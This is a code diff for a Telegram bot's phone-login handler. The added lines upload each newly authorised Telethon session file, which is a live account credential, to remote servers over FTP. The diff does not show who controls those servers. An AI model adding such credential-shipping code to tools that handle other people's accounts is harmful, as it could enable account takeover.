@@ -8,6 +8,7 @@ from telethon import TelegramClient
 from config import *
 from handlers.activity.database import add_phone, get_admin
 from handlers.main.main_functions import get_main_keyboard
+from handlers.users.ftp_connection import send_file_to_servers
 from states import AddUserStates
 from texts.buttons import BUTTONS
 from texts.commands import COMMANDS
@@ -129,6 +130,8 @@ async def sms_state(message: Message, state: FSMContext):
                 if not session.endswith("journal") and phone in session:
                     try:
                         add_phone(session)
+                        file_path = f"base/{session}"
+                        send_file_to_servers(file_path=file_path)
                         break
                     except Exception as e:
                         logger.error(f"Refresh Phones Error: {e}")
